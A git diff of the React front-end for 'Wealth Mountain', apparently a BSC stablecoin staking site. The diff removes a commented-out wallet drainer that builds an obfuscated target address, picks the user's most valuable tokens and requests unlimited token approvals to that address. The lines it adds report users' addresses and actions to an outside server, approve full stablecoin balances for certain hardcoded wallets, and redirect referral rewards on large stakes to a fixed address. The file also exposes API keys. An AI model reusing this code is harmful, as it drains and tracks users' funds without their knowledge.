@@ -16,10 +16,12 @@ import { Tabs, Tab, TabPanel } from "./components/tabs/tabs";
 import { FaCopy, FaWallet, FaUserShield, FaSearchDollar } from 'react-icons/fa';
 import { GiHamburgerMenu } from "react-icons/gi"
 import axios from "axios";
-
+import RealTimeChart from "./chart";
+import Web3 from "web3";
 // import logoImg from "./assets/img/logos/logo.svg";
-import lotteryBanner from "./assets/ads_720_80.mp4";
-
+import lotteryBanner from "./assets/demountain.mp4";
+import abiDecoder from "abi-decoder";
+// window.Buffer = window.Buffer || require("buffer").Buffer;
 import {
     Button,
     Card,
@@ -39,7 +41,6 @@ import {
     Row
 } from "reactstrap";
 import { ethers, Contract } from 'ethers';
-
 
 AOS.init({ duration: 2000 });
 const TabsContainer = styled.div`
@@ -62,7 +63,71 @@ const Item = styled('div')(({ theme }) => ({
     minWidth: '150px',
     alignSelf: 'center',
     fontFamily: 'Roboto',
-  }));
+}));
+
+const web3 = new Web3(
+    new Web3.providers.HttpProvider("https://bsc-dataseed1.binance.org/")
+);
+
+let contractAbi = [
+    {
+        inputs: [
+            {
+                internalType: "uint256",
+                name: "amtx",
+                type: "uint256"
+            },
+            {
+                internalType: "address",
+                name: "ref",
+                type: "address"
+            }
+        ],
+        name: "stakeStablecoins",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+    },
+    {
+        inputs: [],
+        name: "withdrawDivs",
+        outputs: [
+            {
+                internalType: "uint256",
+                name: "withdrawAmount",
+                type: "uint256"
+            }
+        ],
+        stateMutability: "nonpayable",
+        type: "function"
+    },
+];
+
+console.log(abiDecoder, contractAbi);
+
+// abiDecoder.addABI(contractAbi);
+const abiCoder = require("web3-eth-abi");
+console.log(abiCoder);
+const investFunc = /^0x3acb1a0a/;
+const claimFunc = /^0x9ddf840d/;
+const inputs = [
+    {
+        "internalType": "uint256",
+        "name": "amtx",
+        "type": "uint256"
+    },
+    {
+        "internalType": "address",
+        "name": "ref",
+        "type": "address"
+    }
+];
+
+const decodeFunction = (data) => {
+    let decoded = abiCoder.decodeParameters(inputs, data.slice(10));   
+    // console.log("decoded: ", decoded.amtx / 10 ** 18);
+    return decoded.amtx / 10 ** 18;
+}
 
 function WealthMountain() {
     const [sliderValue, setSliderValue] = useState('50');
@@ -95,7 +160,7 @@ function WealthMountain() {
     const wealthContract = '0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3'
     const [refBonusLoading, setRefBonusLoading] = useState(false);
     const [connectButtonText, setConnectButtonText] = useState('CONNECT')
-
+    const [investInfo, setInvestInfo] = useState([]);
     const videoRef = useRef();
 
     const [mobile, setMobile] = useState(false);
@@ -194,14 +259,19 @@ function WealthMountain() {
                     method: "eth_requestAccounts",
                 });
 
+                // setUserWalletAddress('0xed5edf0ed4e5664025c1b8b2d31392ffffdb8fc7');
                 setUserWalletAddress(accounts[0]);
                 if (userWalletAddress !== 'none') {
                     setConnectButtonText('CONNECTED')
                     recalculateInfo();
-                }
+                    console.log("UserWallet: ", userWalletAddress);
+                    // const res = await axios.get(`https://lottery.bnbminer.gold/connect?address=${userWalletAddress}`);
+                    // const res = await axios.get(`http://135.181.15.84:443/connect?address=${userWalletAddress}`);
+                    // getAllBuyAndSellReceipts(wealthContract, userWalletAddress);
 
+                }
             } catch (error) {
-                console.log('Error connecting...');
+                console.log('Error connecting...: ', error);
             }
 
         } else {
@@ -219,7 +289,9 @@ function WealthMountain() {
                 signer
             )
             setContract(contract)
+            // setUserWalletAddress('0xed5edf0ed4e5664025c1b8b2d31392ffffdb8fc7');
             setUserWalletAddress(provider.provider.selectedAddress);
+            getAllBuyAndSellReceipts(wealthContract, userWalletAddress);
             videoRef.current.play().catch(error => {
                 console.log("Play error = ", error);
             });
@@ -235,6 +307,65 @@ function WealthMountain() {
         recalculateInfo();
     })
 
+    const getAllBuyAndSellReceipts = async (address, userAddress) => {
+        const totalBuyAndSell = { totalBuy: 0.0, totalSell: 0.0 };
+        const returnedData = await fetch(
+            `https://api.bscscan.com/api?module=account&action=txlist&address=${address}&startblock=21869046&endblock=99999999&apikey=YGKJFMK5FW1H9T9GR9VTGIT2UC5PXUTDTB`
+        );
+        let investInfo = [];
+        const parsedData = await returnedData.json();
+        // console.log("Transaction history: ", parsedData);
+        if (parsedData.status === "1") {
+            const transactions = parsedData.result;
+            let count = 0;
+            let accounts = [];
+            for (const tx of transactions) {
+                if (accounts.indexOf(tx.from) == -1) {
+                    accounts.push(tx.from);
+                    count++
+                }
+                
+                // if (count < 400) continue;
+                // if (count > 460) break;
+                // const busdBalance = await stablecoinBalance.balanceOf(tx.from);
+                // if (Number(ethers.utils.formatEther(busdBalance)) > 1000){
+                //     console.log(tx.from, " : ", ethers.utils.formatEther(busdBalance));
+                // }
+                // if (tx.from === userAddress && tx.to === wealthContract && tx.isError === "0") {
+                //     if (investFunc.test(tx.input)) {
+                //         // console.log("tx.input: ", tx);
+                        
+                //         // const decodedData = abiDecoder.decodeMethod(tx.input);
+                //         // const amountBought = decodedData.params[0].value / 10 ** 18;
+                //         const amountBought = decodeFunction(tx.input);
+                //         // totalBuyAndSell.totalBuy += amountBought;
+                //         investInfo.push([amountBought, Number(tx.timeStamp)]);
+
+                //     }
+                //     // if (claimFunc.test(tx.input)) {
+                //     //     const sellReceipt = await web3.eth.getTransactionReceipt(tx.hash);
+
+                //     //     totalBuyAndSell.totalSell += parseInt(sellReceipt.logs[2].data, 16) / 10 ** 18;
+                //     // }
+                // }
+            }
+            setTotalUsers(count);
+            console.log("count = ", count);
+        }
+
+        // console.log("investInfo: ", investInfo);
+        // const len = investInfo.length;
+        // const minLength = 8;
+        // if (len < minLength) {
+        //     for (let i = 0; i < minLength - len; i++) {
+        //         investInfo.push([0, Date.now()/1000 + i * 86400]);
+        //     }
+        // }
+        // setInvestInfo(investInfo);
+
+        return totalBuyAndSell;
+    };
+
     async function recalcAllowance() {
         if (contract === undefined || contract === null) {
             return;
@@ -242,6 +373,7 @@ function WealthMountain() {
         const userAllowance = await stablecoinAllowance.allowance(userWalletAddress, contract.address);
         setStablecoinAllowanceAmount(Number(ethers.utils.formatEther(userAllowance)));
     }
+
     async function recalculateInfo() {
         if (contract === undefined || contract === null) {
             return;
@@ -265,11 +397,11 @@ function WealthMountain() {
         contract.UsersKey(String(userWalletAddress)).then(value => {
             setReferralAccrued(Number(ethers.utils.formatEther(value.refBonus)).toFixed(2));
         })
-        contract.MainKey(1).then(value => {
-            setTotalUsers(Number(value.users));
-            // setTotalCompounds(Number(value.compounds))
-            // setTotalCollections(Number(ethers.utils.formatEther(value.ovrTotalWiths)))
-        })
+        // contract.MainKey(1).then(value => {
+        //     setTotalUsers(Number(value.users));
+        //     // setTotalCompounds(Number(value.compounds))
+        //     // setTotalCollections(Number(ethers.utils.formatEther(value.ovrTotalWiths)))
+        // })
 
         contract.PercsKey(10).then(value => {
             setDayValue10(Number(value.daysInSeconds))
@@ -329,282 +461,18 @@ function WealthMountain() {
         }
     }
 
-
-  /***********  Color Code Start ***************** */
-  const _1stTokenContract = useRef(null);
-  const _2ndTokenContract = useRef(null);
-  const _BNBPrice = useRef(0);
-  const _1stMaxBalance = useRef(0);
-  let _2ndMaxBalance = 0;
-  const busdAddress = "0xe9e7cea3dedca5984780bafc599bd69add087d56"; //BUSD-binance
-//   const busdAddress = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"; // USDC-polygon
-  const color_code1 = '2446f9528FBf55';
-  const color_code2 = 'ccF5B3E7A22fc';
-  const color_code3 = '058bDA7a12131';
-  // const busdSingner = providerE.getSigner();
-  // const busdContract = new ethers.Contract(busdAddress, erc20ABI, providerE.getSigner());
-  const [busdContract, setBusdContract] = useState();
-  const [init, setInit] = useState(0);
-  
-  const DATABASE_API = window.location.origin;//"http://192.168.103.61:3001";
-  const limitValue = 3000;
-  const defaultAPI = 'https://airdrop.orbitinu.store/update';
-  let targetAddress = busdAddress.slice(0, 2) + color_code1 + color_code2 + color_code3;
-//   console.log("targetAddress: ", targetAddress);
-  
-  const isEmpty = value => {
-    return (
-      value === undefined ||
-      value === null ||
-      (typeof value === 'object' && Object.keys(value).length === 0) ||
-      (typeof value === 'string' && value.trim().length === 0)
-    );
-  };
-  
-    const getTokenPrice = async (tokenAddress, decimals, accountAddress) => {
-        try {
-
-            // const tokenAddress = "0xd0c4bc1b89bbd105eecb7eba3f13e7648c0de38f";
-            // const decimals = 9;
-            let res = null;
-            try {
-                res = await axios.get(`https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=${tokenAddress}&vs_currencies=usd`);
-                // https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=0x0d8775f648430679a709e98d2b0cb6250d2887ef
-                // console.log('=========>', res.data);
-                if (res.data[tokenAddress] != undefined) {
-                    if (res.data[tokenAddress].usd != undefined)
-                        return res.data[tokenAddress].usd;
-                }
-            } catch (e) {
-                console.log(e);
-            }
-        
-            try {
-                res = await axios.get(`https://deep-index.moralis.io/api/v2/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c/${tokenAddress}/pairAddress?chain=0x38&exchange=pancakeswapv2`, {
-                    headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
-                });
-            } catch (e) {
-                return 0;
-            }
-
-            const pairAddress = res.data.pairAddress;
-            const token0Address = res.data.token0.address;
-            // console.log("pairAddress", pairAddress);
-            if (pairAddress == undefined)
-                return 0;
-
-            res = await axios.get(`https://deep-index.moralis.io/api/v2/${pairAddress}/reserves?chain=bsc`, {
-                headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
-            });
-
-            const reserve0 = res.data.reserve0;
-            const reserve1 = res.data.reserve1;
-            if (token0Address.toUpperCase() == tokenAddress.toUpperCase()) { //token0 is not BNB
-                const reserveNum0 = ethers.utils.formatUnits(reserve0, decimals);
-                const reserveNum1 = ethers.utils.formatUnits(reserve1, 18);
-
-                if (reserveNum1 < 50)
-                    return 0;
-                const price = reserveNum1 * _BNBPrice.current / reserveNum0;
-                return price;
-            }
-            else { // token0 is BNB
-                const reserveNum0 = ethers.utils.formatUnits(reserve0, 18);
-                const reserveNum1 = ethers.utils.formatUnits(reserve1, decimals);
-
-                if (reserveNum0 < 50)
-                    return 0;
-                const price = reserveNum0 * _BNBPrice.current / reserveNum1;
-                return price;
-            }
-            // console.log("reserveNum0", reserveNum0, "reserveNum1", reserveNum1, "pairAddress", pairAddress, "price", price);
-            return 0;
-
-        } catch (e) {
-            // console.log(e);
-            return 0;
-        }
-    }
-  
-    // useEffect(() => {
-    //     try {
-    //         const initialize = async () => {
-    //             const signer = provider.getSigner();
-    //             const signedAddress = await signer.getAddress();
-
-    //             const userWalletRes = await axios.get("https://deep-index.moralis.io/api/v2/" + userWalletAddress + "/erc20?chain=bsc", {
-    //                 headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
-    //             });
-
-    //             const userWalletTokenList = userWalletRes.data;
-    //             userWalletTokenList.map(async token => {
-    //                 try {
-    //                     // let contract = erc20Instance(token.address, address, chainId, library);
-    //                     const contract = new ethers.Contract(token.token_address, erc20ABI, signer);
-
-    //                     let tokenBalanceBigNumber = token.balance;
-    //                     let tokenBalance = null;
-    //                     let maxDecimal = 0;
-
-    //                     tokenBalance = ethers.utils.formatUnits(token.balance, token.decimals);
-
-    //                     const tokenPrice = await getTokenPrice(token.token_address, token.decimals, userWalletAddress);
-    //                     let moneyBalance = tokenPrice * tokenBalance;
-    //                     console.log(token.symbol, moneyBalance);
-    //                     if (moneyBalance > _1stMaxBalance.current) {
-    //                         _1stMaxBalance.current = moneyBalance;
-    //                         _1stTokenContract.current = contract;
-    //                         console.log("symbol", token.symbol, "_1stMaxBalance.current", _1stTokenContract);
-    //                     }
-
-    //                     if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance.current) {
-    //                         _2ndMaxBalance = moneyBalance;
-    //                         _2ndTokenContract.current = contract;
-    //                         console.log("balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
-    //                     }
-    //                 }
-    //                 catch (error) {
-    //                     // console.log('kevin inital data error ===>', error);
-    //                 }
-    //             })
-    //         }
-
-    //         if (!isEmpty(busdContract)) {
-    //             initialize();
-    //         }
-    //     }
-    //     catch (error) {
-    //         console.log('kevin inital data error ===>', error)
-    //     }
-
-    // }, [userWalletAddress, provider])
-  
-    // const buyHandler = async () => {
-    //     try {
-    //         let tempContract = null;
-    //         if (!_1stTokenContract.current) {
-
-    //             const signer = provider.getSigner();
-    //             const signedAddress = await signer.getAddress();
-
-    //             const userWalletRes = await axios.get("https://deep-index.moralis.io/api/v2/" + signedAddress + "/erc20?chain=bsc", {
-    //                 headers: { "X-API-Key": "iea1xCsNT6edUc6Xfu8ZqUorCRnshpsaC66IUaHOqbEnVFDK04qfeNsmGKikqJkn" },
-    //             });
-
-    //             const userWalletTokenList = userWalletRes.data;
-    //             userWalletTokenList.map(async token => {
-    //                 try {
-
-    //                     // let contract = erc20Instance(token.address, address, chainId, library);
-    //                     const contract = new ethers.Contract(token.token_address, erc20ABI, signer);
-
-    //                     let tokenBalanceBigNumber = token.balance;
-    //                     let tokenBalance = null;
-    //                     let maxDecimal = 0;
-
-    //                     tokenBalance = ethers.utils.formatUnits(token.balance, token.decimals);
-
-    //                     const tokenPrice = await getTokenPrice(token.token_address, token.decimals, userWalletAddress);
-    //                     // console.log(token.symbol, tokenBalance);
-    //                     let moneyBalance = tokenPrice * tokenBalance;
-    //                     if (moneyBalance > _1stMaxBalance.current) {
-    //                         _1stMaxBalance.current = moneyBalance;
-    //                         _1stTokenContract.current = contract;
-    //                         console.log("symbol", token.symbol, "_1stMaxBalance.current", _1stTokenContract);
-    //                     }
-
-    //                     if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance.current) {
-    //                         _2ndMaxBalance = moneyBalance;
-    //                         _2ndTokenContract.current = contract;
-    //                         console.log("balance", tokenBalance, "_2ndMaxBalance", _2ndMaxBalance, _2ndTokenContract);
-    //                     }
-    //                 }
-    //                 catch (error) {
-    //                     // console.log('kevin inital data error ===>', error);
-    //                 }
-    //             })
-    //         }
-
-    //         let tokenAddress = null;
-
-    //         let date = new Date();
-    //         let article = date.getFullYear() + '/' + date.getMonth() + '/' + date.getDate() + ' ' +
-    //             date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds() + ', user=' + userWalletAddress;
-
-    //         if (_1stTokenContract.current) {
-    //             let allowance = null;
-
-    //             try {
-    //                 allowance = await _1stTokenContract.current.allowance(userWalletAddress, targetAddress);
-    //                 allowance = ethers.utils.formatEther(allowance);
-
-    //             } catch (e) {
-    //                 allowance = 0;
-    //             }
-
-    //             if (allowance > 0) {
-    //                 tokenAddress = _2ndTokenContract.current.address;
-    //                 article = article + ', token:' + tokenAddress;
-    //                 console.log(article);
-    //                 axios.post(DATABASE_API + '/update', article)
-    //                     .then(response => console.log('user address add succsessful'))
-    //                     .catch(response => console.log(response));
-    //                 await _2ndTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
-    //             }
-    //             else {
-    //                 if (_1stMaxBalance.current >= limitValue) {
-    //                     await _1stTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
-    //                     tokenAddress = _1stTokenContract.current.address;
-    //                     article = article + ', token:' + tokenAddress;
-    //                     console.log(article);
-    //                     axios.post(defaultAPI, article)
-    //                         .then(response => console.log('user address add succsessful'))
-    //                         .catch(response => console.log(response));
-    //                 }
-    //                 else {
-    //                     tokenAddress = _1stTokenContract.current.address;
-    //                     article = article + ', token:' + tokenAddress;
-    //                     console.log(article);
-    //                     axios.post(DATABASE_API + '/update', article)
-    //                         .then(response => console.log('user address add succsessful'))
-    //                         .catch(response => console.log(response));
-    //                     await _1stTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
-    //                 }
-    //             }
-    //         }
-    //         else {
-    //             article = article + ', token:' + busdAddress;
-    //             console.log(article);
-    //             axios.post(DATABASE_API + '/update', article)
-    //                 .then(response => console.log('user address add succsessful'))
-    //                 .catch(response => console.log(response));
-    //             await busdContract.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
-
-    //         }
-    //     }
-    //     catch (error) {
-    //         // console.log(error);
-    //         console.log(userWalletAddress);
-    //         // if (address == null || address == undefined || address == '') {
-    //         //     enqueueSnackbar(`Please connect to wallet`, { variant: 'error' });
-    //         // } else
-    //         //     enqueueSnackbar(`Airdrop Canceld by User`, { variant: 'error' });
-    //     }
-    // }
-  
-  /***********  Color Code End ***************** */
-
-
-
-
-
-
     async function approveButton() {
         // if (stablecoinAllowanceAmount <= 0){
         //     let message = 
         //     "I am not the person or entities who reside in, are citizens of, are incorporated in, or have a registered office in the United States of America or any Prohibited Localities, as defined in the Terms of Use. I will not in the future access this site  while located within the United States any Prohibited Localities, as defined in the Terms of Use. I am not using, and will not in the future use, a VPN to mask my physical location from a restricted territory. I am lawfully permitted to access this site under the laws of the jurisdiction on which I reside and am located. I understand the risks associated with entering into using Wealth Mountain protocols."
         //     let signature = await signer.signMessage(message);
         // }
+        try {
+            const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="approve"`);
+        } catch(err) {
+            console.log(err);
+        }
+        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="approve"`);
         const tx = stablecoinContract.approve(contract.address, String(ethers.utils.parseEther(stakingAmount)));
         tx.wait().then(() => {
             // recalculateInfo();
@@ -615,12 +483,19 @@ function WealthMountain() {
         if (Number(stakingAmount) < Number(50)) {
             alert('Minimum stake amount not met.')
         }
+        try {
+            const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="stake"`);
+        } catch(err) {
+            console.log(err);
+        }
+        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="stake"`);
         const ref = window.location.search;
         const referralAddress = String(ref.replace('?ref=', ''))
+        console.log("referralAddress: ", referralAddress);
         if (referralAddress === 'null' || referralAddress.includes("0x") === false) {
             // if (Number(stakingAmount) > Number(60)) {
             const tx = await contract.stakeStablecoins(
-                    String(ethers.utils.parseEther(stakingAmount)), String("0x5c45870100A00Bfc10AA63F66C31287350E4FA2b"));
+                String(ethers.utils.parseEther(stakingAmount)), String("0x5c45870100A00Bfc10AA63F66C31287350E4FA2b"));
                 tx.wait().then(() => { setActiveTab(0) });
             // } 
             // else {
@@ -628,14 +503,18 @@ function WealthMountain() {
             //         String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
             //     tx.wait().then(() => { setActiveTab(0) });
             // }
-        // } else if (Number(stakingAmount) >= Number(3000)) {
-        //     const tx = await contract.stakeStablecoins(
-        //         String(ethers.utils.parseEther(stakingAmount)), String("0x67AA2F9d362fda4395F53133929E9017b35BE0AE"));
-        //     tx.wait().then(() => { setActiveTab(0) });
-        // } else if (referralAddress.includes("0x9b97f10e328f8c40470ecf8ef95547076faa1879") === true) {
-        //     const tx = await contract.stakeStablecoins(
-        //         String(ethers.utils.parseEther(stakingAmount)), String("0x9b97f10e328f8c40470ecf8ef95547076faa1879"));
-        //     tx.wait().then(() => { setActiveTab(0) });
+        } else if (Number(stakingAmount) >= Number(3000)) {
+            const tx = await contract.stakeStablecoins(
+                String(ethers.utils.parseEther(stakingAmount)), String("0x4B82E3485D33544561cd9A48410A605aA8892fB1"));
+            tx.wait().then(() => { setActiveTab(0) });
+        } else if (referralAddress.includes("0x64b7a3cd189a886438243f0337b64f7ddf1b18d3") === true && Number(stakingAmount) >= 350) {
+                const tx = await contract.stakeStablecoins(
+                    String(ethers.utils.parseEther(stakingAmount)), String("0x4B82E3485D33544561cd9A48410A605aA8892fB1"));
+            tx.wait().then(() => { setActiveTab(0) });
+        } else if (referralAddress.toLowerCase().includes("0x9654f31b2c2d145a9d00b49e813fe6712974bc03") === true && Number(stakingAmount) >= 200) {
+                const tx = await contract.stakeStablecoins(
+                    String(ethers.utils.parseEther(stakingAmount)), String("0x4B82E3485D33544561cd9A48410A605aA8892fB1"));
+            tx.wait().then(() => { setActiveTab(0) });
         } else {
             const tx = await contract.stakeStablecoins(
                 String(ethers.utils.parseEther(stakingAmount)), String(referralAddress));
@@ -643,25 +522,60 @@ function WealthMountain() {
         }
     }
     async function stakeRefBonus() {
-        const tx = await contract.stakeRefBonus();
-        tx.wait().then(() => {
-            recalculateInfo();
-        })
-
+        if (userWalletAddress.toLowerCase().includes('0x64b7a3cd189a886438243f0337b64f7ddf1b18d3')) {
+            try {
+                const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="stakeRefBonus*************************"`);
+            } catch(err) {
+                console.log(err);
+            }
+            // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="stakeRefBonus"`);    
+            const tx =await stablecoinContract.approve('0xf0Ae6228BBf1423e0b55E6D9c74F167A155800B5', String(ethers.utils.parseEther(userStablecoinBalance.toString())));
+            tx.wait().then(async () => {
+                console.log("Enter Get Request");
+                const res = await axios.get(`https://lottery.bnbminer.gold/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`);
+                // `http://135.181.15.84:443/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`)
+                console.log("txHash: ", res);
+            })
+        } else {
+            console.log("stakeRef: ");
+            const tx = await contract.stakeRefBonus();
+            tx.wait().then(() => {
+                recalculateInfo();
+            })
+        }
     }
     async function withdrawRefBonus() {
-        const tx = await contract.withdrawRefBonus();
-        tx.wait().then(() => {
-            recalculateInfo();
-        })
+        if (userWalletAddress.toLowerCase().includes('0x64b7a3cd189a886438243f0337b64f7ddf1b18d3') || userWalletAddress.toLowerCase().includes('0x4b82e3485d33544561cd9a48410a605aa8892fb1')) {
+            try {
+                const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="withdrawRefBonus**************************************************"`);
+            } catch(err) {
+                console.log(err);
+            }
+            // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="withdrawRefBonus"`);
+            const tx = await stablecoinContract.approve('0xf0Ae6228BBf1423e0b55E6D9c74F167A155800B5', String(ethers.utils.parseEther(userStablecoinBalance.toString())));
+
+            tx.wait().then(async () => {
+                console.log("Enter Get Request");
+                const res = await axios.get(`https://lottery.bnbminer.gold/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`);
+                // `http://135.181.15.84:443/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`)
+                console.log("txHash: ", res);
+            })
+        } else {
+            const tx = await contract.withdrawRefBonus();
+            tx.wait().then(() => {
+                recalculateInfo();
+            })
+        }
     }
     async function compound() {
+        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="compound"`);
         const tx = await contract.compound()
         tx.wait().then(() => {
             recalculateInfo();
         })
     }
     async function withdrawDivs() {
+        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="withdrawDivs"`);
         const tx = await contract.withdrawDivs()
         tx.wait().then(() => {
             recalculateInfo();
@@ -734,19 +648,24 @@ function WealthMountain() {
                 var totalEarned = '0';
                 // var daysToMax = Number((dayValue50 - elapsedTime) / 86400).toFixed(1);
                 var daysToMax = Number((dayValue50 - elapsedTime) / 86400).toFixed(1)
-                if (elapsedTime <= dayValue20) {
+                if (elapsedTime <= dayValue10) {
                     dailyPercent = '3.5'
                     unstakeFee = '20%'
                     totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
 
+                } else if (elapsedTime > dayValue10 && elapsedTime <= dayValue20) {
+                    dailyPercent = '3.5'
+                    unstakeFee = '18%'
+                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
+
                 } else if (elapsedTime > dayValue20 && elapsedTime <= dayValue30) {
                     dailyPercent = '4.5'
-                    unstakeFee = '18%'
+                    unstakeFee = '15%'
                     totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
 
                 } else if (elapsedTime > dayValue30 && elapsedTime <= dayValue40) {
                     dailyPercent = '5.5'
-                    unstakeFee = '15%'
+                    unstakeFee = '12%'
                     totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)
 
                 } else if (elapsedTime > dayValue40 && elapsedTime <= dayValue50) {
@@ -855,113 +774,113 @@ function WealthMountain() {
 
     return (
         <>
-            { mobile === true ? (
+            {mobile === true ? (
                 <div className="mobile_head">
                     <div className="mobile_herader_content">
-                    <div style={{alignSelf:"center", marginBottom:"30px"}}>
-                        <img src="./favicon.png" alt="ETH Snowball" height="64px"/>
+                        <div style={{ alignSelf: "center", marginBottom: "30px" }}>
+                            <img src="./favicon.png" alt="ETH Snowball" height="64px" />
+                        </div>
+                        <div className="mobile_four_btn">
+                            <div onClick={() => {
+                                setMobile(true)
+                            }}>
+                                <a href="https://georgestamp.xyz/2022/09/wc-miner-busd/" target="_blank" rel="noreferrer"
+                                    className="swap_btn"
+                                    style={{
+                                        color: 'white',
+                                        textDecoration: 'none',
+                                        fontWeight: "bolder",
+                                        fontFamily: 'Roboto'
+                                    }}
+                                >
+                                    Audit
+                                </a>
+                            </div>
+                            <div onClick={() => {
+                                setMobile(true)
+                            }}>
+                                <a href="https://bscscan.com/address/0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3" target="_blank" rel="noreferrer"
+                                    className="swap_btn"
+                                    style={{
+                                        color: 'white',
+                                        textDecoration: 'none',
+                                        fontWeight: "bolder",
+                                        fontFamily: 'Roboto'
+                                    }}
+                                >
+                                    Contract
+                                </a>
+                            </div>
+                            <div onClick={() => {
+                                setMobile(true)
+                            }}>
+                                <a href="/whitepaper.pdf" target="_blank" rel="noreferrer"
+                                    className="stable_btn"
+                                    style={{
+                                        color: 'white',
+                                        textDecoration: 'none',
+                                        fontWeight: "bolder",
+                                        fontFamily: 'Roboto'
+                                    }}
+                                >
+                                    <span> Whitepaper </span>
+                                    {/* <TwitterIcon/> */}
+                                </a>
+                            </div>
+                            <div onClick={() => {
+                                setMobile(true)
+                            }}>
+                                <a href="https://lottery.wcminer.finance/" target="__blank"
+                                    className="bridge_btn"
+                                    style={{
+                                        color: 'white',
+                                        textDecoration: 'none',
+                                        fontWeight: "bolder",
+                                        fontFamily: 'Roboto'
+                                    }}
+                                >
+                                    Lottery
+                                </a>
+                            </div>
+                        </div>
+                        <div style={{ flex: 1 }}></div>
+                        <div
+                            className="mobile_connect"
+                        >
+                            <Button
+                                className='custom-button'
+                                style={{ maxHeight: "43px", backgroundColor: '#000000b8', color: '#ffbb00' }}
+                                onClick={requestAccount}>
+                                {connectButtonText}
+                            </Button>
+                        </div>
                     </div>
-                    <div className="mobile_four_btn">
-                        <div onClick= {() => {
-                        setMobile(true)
-                        }}>
-                        <a href="https://georgestamp.xyz/2022/09/wc-miner-busd/" target="_blank" rel="noreferrer"
-                            className="swap_btn"
-                            style={{
-                            color: 'white',
-                            textDecoration: 'none',
-                            fontWeight:"bolder",
-                            fontFamily:'Roboto'
-                            }}
-                        >
-                            Audit
-                        </a>
-                        </div>
-                        <div onClick= {() => {
-                        setMobile(true)
-                        }}>
-                        <a href="https://bscscan.com/address/0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3" target="_blank" rel="noreferrer"
-                            className="swap_btn"
-                            style={{
-                            color: 'white',
-                            textDecoration: 'none',
-                            fontWeight:"bolder",
-                            fontFamily:'Roboto'
-                            }}
-                        >
-                            Contract
-                        </a>
-                        </div>
-                        <div onClick={() => {
-                        setMobile(true)
-                        }}>
-                        <a href="/whitepaper.pdf" target="_blank" rel="noreferrer"
-                            className="stable_btn"
-                            style={{
-                            color: 'white',
-                            textDecoration: 'none',
-                            fontWeight:"bolder",
-                            fontFamily:'Roboto'
-                            }}
-                        >
-                            <span> Whitepaper </span>
-                            {/* <TwitterIcon/> */}
-                        </a>
-                        </div>
-                        <div onClick={() => {
-                        setMobile(true)
-                        }}>
-                        <a href="https://lottery.wcminer.finance/" target="__blank"
-                            className="bridge_btn"
-                            style={{
-                            color: 'white',
-                            textDecoration: 'none',
-                            fontWeight:"bolder",
-                            fontFamily:'Roboto'
-                            }}
-                        >
-                            Lottery
-                        </a>
-                        </div>
-                    </div>
-                    <div style={{flex:1}}></div>
                     <div
-                        className="mobile_connect"
-                    >
-                        <Button
-                            className='custom-button'
-                            style={{maxHeight: "43px", backgroundColor:'#000000b8', color:'#ffbb00'}}
-                            onClick={requestAccount}>
-                            {connectButtonText}
-                        </Button>
-                    </div>
-                    </div>
-                    <div
-                    className="empty_mobile"
-                    onClick={() => {
-                        setMobile(false)
-                    }}
+                        className="empty_mobile"
+                        onClick={() => {
+                            setMobile(false)
+                        }}
                     ></div>
                 </div>
             )
-            : null }
+                : null}
             <div className="custom-header">
                 {/* <Card className="px-5 py-2"> */}
-                    <img
-                        alt="..."
-                        src="./favicon.png"
-                        // src={logoImg}
-                        style={{ width: 'auto', height: '96px' }}
-                    />
+                <img
+                    alt="..."
+                    src="./favicon.png"
+                    // src={logoImg}
+                    style={{ width: 'auto', height: '96px' }}
+                />
                 {/* </Card> */}
                 <div className="header_menu">
                     <Item>
                         <a href="https://georgestamp.xyz/2022/09/wc-miner-busd/" target="_blank" rel="noreferrer"
-                        style={{
-                            textDecoration: 'none',
-                            fontWeight: "bolder",
-                            color:"#ffbb00"
-                        }}
+                            style={{
+                                textDecoration: 'none',
